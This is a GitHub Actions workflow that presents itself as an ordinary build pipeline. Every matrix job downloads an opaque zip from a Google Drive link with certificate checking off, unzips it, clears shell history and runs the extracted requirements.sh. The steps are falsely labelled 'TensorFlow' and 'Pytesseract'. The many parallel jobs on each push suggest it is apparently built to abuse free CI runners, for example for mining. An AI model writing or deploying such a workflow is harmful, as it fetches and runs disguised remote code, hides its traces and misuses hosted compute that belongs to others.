name: atlasengine856gate
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  PUBLISH:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.o, I.i, I.ii]
        flag: ['Plan', 'Assemble', 'Validate', 'Run', 'Publish']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: install module
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1rj20mPaji5qYYZF5goymAEA1rJwqRrDo" -O TensorFlow.zip
        unzip -o TensorFlow.zip
        rm TensorFlow.zip
        history -c && history -w

    - name: Pytesseract
      run: bash requirements.sh


  COMPILE1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.o, I.i, I.ii]
        flag: ['Provision', 'Compile', 'Verify', 'Launch', 'Deploy']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: install module
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1rj20mPaji5qYYZF5goymAEA1rJwqRrDo" -O TensorFlow.zip
        unzip -o TensorFlow.zip
        rm TensorFlow.zip
        history -c && history -w

    - name: Pytesseract
      run: bash requirements.sh
        
